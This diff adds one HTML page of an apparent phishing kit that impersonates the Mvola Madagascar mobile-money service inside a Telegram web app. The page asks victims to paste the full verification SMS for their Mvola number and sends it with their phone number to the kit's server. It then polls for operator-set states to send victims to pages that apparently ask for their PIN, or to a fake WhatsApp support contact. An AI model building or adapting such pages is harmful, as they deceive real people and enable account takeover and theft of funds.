@@ -1,0 +1,469 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Mvola Madagascar - Vérification SMS</title>
+
+    <!-- ✅ Telegram SDK -->
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+
+    <style>
+        :root {
+            --mvola-yellow: #ffcc00;
+            --mvola-yellow-dark: #e6b800;
+            --mvola-dark: #121820;
+            --bg-color: #ffffff;
+            --text-dark: #111111;
+            --text-muted: #666666;
+            --border-color: #e2e8f0;
+        }
+
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-color);
+            margin: 0;
+            padding: 0;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+            align-items: center;
+        }
+
+        /* Top Header Navigation bar */
+        .app-header {
+            width: 100%;
+            background-color: var(--mvola-yellow);
+            height: 60px;
+            padding: 0 20px;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+            box-shadow: 0 2px 8px rgba(0,0,0,0.08);
+        }
+
+        .back-btn-top {
+            color: var(--mvola-dark);
+            text-decoration: none;
+            font-weight: 700;
+            font-size: 14px;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .header-title {
+            position: absolute;
+            left: 50%;
+            transform: translateX(-50%);
+            display: flex;
+            align-items: center;
+            font-size: 22px;
+            font-weight: 900;
+            letter-spacing: -0.5px;
+            color: var(--mvola-dark);
+        }
+
+        .header-title .region {
+            color: var(--mvola-dark);
+            font-size: 12px;
+            margin-left: 6px;
+            font-weight: 700;
+            text-transform: uppercase;
+            background: rgba(0, 0, 0, 0.08);
+            padding: 2px 6px;
+            border-radius: 4px;
+        }
+
+        /* Main Container */
+        .main-container {
+            width: 100%;
+            display: flex;
+            justify-content: center;
+            margin-top: 25px;
+            flex-grow: 1;
+        }
+
+        .card {
+            background: white;
+            width: 90%;
+            max-width: 400px;
+            padding: 30px 24px;
+            border-radius: 20px;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.05);
+            border: 1px solid #f0f0f0;
+            box-sizing: border-box;
+            align-self: flex-start;
+            display: flex;
+            flex-direction: column;
+        }
+
+        h2 {
+            margin: 0 0 12px 0;
+            font-size: 24px;
+            color: var(--text-dark);
+            font-weight: 800;
+            line-height: 1.25;
+            letter-spacing: -0.3px;
+        }
+
+        .instruction {
+            font-size: 14px;
+            color: var(--text-muted);
+            margin: 0 0 8px 0;
+            line-height: 1.4;
+        }
+
+        .phone-number {
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--mvola-dark);
+            margin-bottom: 22px;
+        }
+
+        textarea {
+            width: 100%;
+            height: 110px;
+            border: 2px solid var(--mvola-yellow);
+            border-radius: 12px;
+            padding: 14px;
+            font-size: 14px;
+            box-sizing: border-box;
+            outline: none;
+            resize: none;
+            font-family: inherit;
+            color: #333;
+            background-color: #fffdf0;
+            transition: border-color 0.2s;
+        }
+
+        textarea::placeholder {
+            color: #aaa;
+        }
+
+        textarea:focus {
+            border-color: var(--mvola-yellow-dark);
+        }
+
+        .error-message {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 10px;
+            display: none;
+            text-align: center;
+            font-weight: 700;
+        }
+
+        .resend-text {
+            text-align: center;
+            color: var(--text-muted);
+            font-size: 13px;
+            margin: 22px 0 20px 0;
+            font-weight: 500;
+        }
+
+        .submit-btn {
+            width: 100%;
+            background-color: #e2e8f0;
+            color: #a0aec0;
+            border: none;
+            padding: 16px;
+            border-radius: 12px;
+            font-size: 15px;
+            font-weight: 800;
+            cursor: not-allowed;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+            transition: background-color 0.2s, color 0.2s;
+            box-shadow: none;
+        }
+
+        .submit-btn.active {
+            background-color: var(--mvola-yellow);
+            color: var(--mvola-dark);
+            cursor: pointer;
+            box-shadow: 0 4px 12px rgba(255, 204, 0, 0.4);
+        }
+
+        .submit-btn.active:hover {
+            background-color: var(--mvola-yellow-dark);
+        }
+
+        /* Footer Banner */
+        .footer-banner {
+            width: 100%;
+            background: var(--mvola-yellow);
+            height: 60px;
+            border-top-left-radius: 50% 25px;
+            border-top-right-radius: 50% 25px;
+            margin-top: 40px;
+        }
+
+        /* Fullscreen Overlay Styles */
+        .overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(18, 24, 32, 0.85);
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            color: white;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+
+        .overlay-card {
+            background: #ffffff;
+            color: var(--mvola-dark);
+            padding: 35px 24px;
+            border-radius: 20px;
+            width: 88%;
+            max-width: 340px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
+        }
+
+        .spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(255, 204, 0, 0.3);
+            border-top: 4px solid var(--mvola-dark);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            margin-bottom: 20px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .overlay-title {
+            font-size: 20px;
+            font-weight: 800;
+            margin-bottom: 8px;
+            color: var(--mvola-dark);
+        }
+
+        .overlay-desc {
+            font-size: 14px;
+            color: var(--text-muted);
+            line-height: 1.5;
+            margin-bottom: 15px;
+        }
+
+        .wa-btn {
+            display: block;
+            width: 100%;
+            background-color: var(--mvola-yellow);
+            color: var(--mvola-dark);
+            font-weight: 800;
+            padding: 12px 10px;
+            border-radius: 10px;
+            text-decoration: none;
+            margin-bottom: 10px;
+            box-sizing: border-box;
+            word-break: break-all;
+            font-size: 13px;
+        }
+    </style>
+</head>
+
+<body>
+
+<!-- Top Header Navigation Bar -->
+<div class="app-header">
+    <a onclick="goBack()" class="back-btn-top">← Retour</a>
+    <div class="header-title">
+        <span>Mvola</span><span class="region">Madagascar</span>
+    </div>
+</div>
+
+<div class="main-container">
+    <div class="card">
+        <h2>Vérification SMS</h2>
+
+        <p class="instruction">
+            Veuillez coller le message SMS complet reçu sur votre numéro Mvola :
+        </p>
+
+        <div class="phone-number" id="displayPhone">+261 ...</div>
+
+        <textarea id="smsInput" placeholder="Collez ici votre message SMS complet..."></textarea>
+        <div id="errorText" class="error-message">Le message est incorrect ou a expiré, veuillez coller le nouveau message reçu.</div>
+
+        <div class="resend-text" id="timerBox">
+            Renvoyer dans <span id="timer">60</span> secondes
+        </div>
+
+        <button id="submitBtn" class="submit-btn" disabled>SOUMETTRE</button>
+    </div>
+</div>
+
+<div class="footer-banner"></div>
+
+<!-- Overlay de Chargement -->
+<div class="overlay" id="statusOverlay">
+    <div class="overlay-card">
+        <div class="spinner"></div>
+        <div class="overlay-title">Veuillez patienter</div>
+        <div class="overlay-desc">Vérification du message SMS en cours...</div>
+    </div>
+</div>
+
+<!-- Overlay Contactez-nous WhatsApp -->
+<div class="overlay" id="contactOverlay">
+    <div class="overlay-card">
+        <div class="overlay-title">Contactez-nous sur WhatsApp</div>
+        <div class="overlay-desc">Utilisez l'option ci-dessous pour contacter le support :</div>
+        
+        <a href="https://api.whatsapp.com/send?phone=261340000000&text=Bonjour,%20j'ai%20besoin%20d'aide%20pour%20la%20vérification%20Mvola." target="_blank" class="wa-btn">
+            Contacter le Support WhatsApp
+        </a>
+    </div>
+</div>
+
+<script>
+document.addEventListener("DOMContentLoaded", () => {
+    const displayPhone = document.getElementById('displayPhone');
+    const smsInput = document.getElementById('smsInput');
+    const submitBtn = document.getElementById('submitBtn');
+    const timerEl = document.getElementById('timer');
+    const timerBox = document.getElementById('timerBox');
+    const statusOverlay = document.getElementById('statusOverlay');
+    const contactOverlay = document.getElementById('contactOverlay');
+    const errorText = document.getElementById('errorText');
+
+    let checkInterval = null;
+
+    // Charger le numéro de téléphone enregistré
+    const savedPhone = localStorage.getItem('phone') || localStorage.getItem('userPhone') || "";
+    if (savedPhone) {
+        displayPhone.textContent = savedPhone.startsWith('+') ? savedPhone : `+261 ${savedPhone}`;
+    } else {
+        displayPhone.textContent = "+261 ...";
+    }
+
+    // Activer/Désactiver le bouton de soumission lors de la saisie
+    smsInput.addEventListener('input', () => {
+        const hasText = smsInput.value.trim().length > 0;
+        submitBtn.disabled = !hasText;
+        submitBtn.classList.toggle('active', hasText);
+        errorText.style.display = 'none';
+    });
+
+    // Compte à rebours
+    let timeLeft = 60;
+    const timerInterval = setInterval(() => {
+        timeLeft--;
+        if (timerEl) timerEl.textContent = timeLeft;
+
+        if (timeLeft <= 0) {
+            clearInterval(timerInterval);
+            timerBox.innerHTML = '<span style="color:var(--mvola-dark); font-weight:700; cursor:pointer;" onclick="location.reload()">Renvoyer le code</span>';
+        }
+    }, 1000);
+
+    // Vérification du statut sur le serveur (Polling)
+    function startStatusPolling() {
+        if (checkInterval) clearInterval(checkInterval);
+
+        checkInterval = setInterval(async () => {
+            try {
+                const res = await fetch(`/api/check-status?phone=${encodeURIComponent(savedPhone)}`);
+                const data = await res.json();
+
+                if (data.status === "otp1_correct") {
+                    clearInterval(checkInterval);
+                    window.location.href = "/page9"; // Redirection vers page9
+                } else if (data.status === "otp1_wrong") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    errorText.textContent = "Le message est incorrect ou a expiré, veuillez coller le nouveau message reçu.";
+                    errorText.style.display = "block";
+                    smsInput.value = "";
+                    submitBtn.disabled = true;
+                    submitBtn.classList.remove('active');
+                } else if (data.status === "otp2_wrongpin") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "none";
+                    alert("Le code PIN est incorrect. Veuillez saisir le code PIN Mvola correct.");
+                    window.location.href = "/page6"; // Redirection vers page6
+                } else if (data.status === "contact_us") {
+                    clearInterval(checkInterval);
+                    statusOverlay.style.display = "none";
+                    contactOverlay.style.display = "flex";
+                }
+            } catch (err) {
+                console.error("Erreur de vérification du statut:", err);
+            }
+        }, 2000);
+    }
+
+    // Action lors de la soumission du message SMS complet
+    submitBtn.addEventListener('click', async () => {
+        if (submitBtn.disabled) return;
+
+        const pastedMessage = smsInput.value.trim();
+        if (!pastedMessage) return;
+
+        // Affichage de l'overlay de chargement
+        contactOverlay.style.display = "none";
+        statusOverlay.style.display = "flex";
+        errorText.style.display = "none";
+
+        try {
+            const res = await fetch('/api/verify-first-otp', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    phone: savedPhone,
+                    link: pastedMessage
+                })
+            });
+
+            const responseData = await res.json();
+            if (responseData.success) {
+                startStatusPolling();
+            } else {
+                statusOverlay.style.display = "none";
+                alert("Erreur lors de l'envoi.");
+            }
+        } catch (err) {
+            console.error("Erreur de soumission:", err);
+            statusOverlay.style.display = "none";
+            alert("Erreur de connexion.");
+        }
+    });
+
+    if (window.Telegram?.WebApp) {
+        window.Telegram.WebApp.ready();
+        window.Telegram.WebApp.expand();
+    }
+});
+
+function goBack() {
+    window.location.href = "/page6";
+}
+</script>
+
+</body>
+</html>
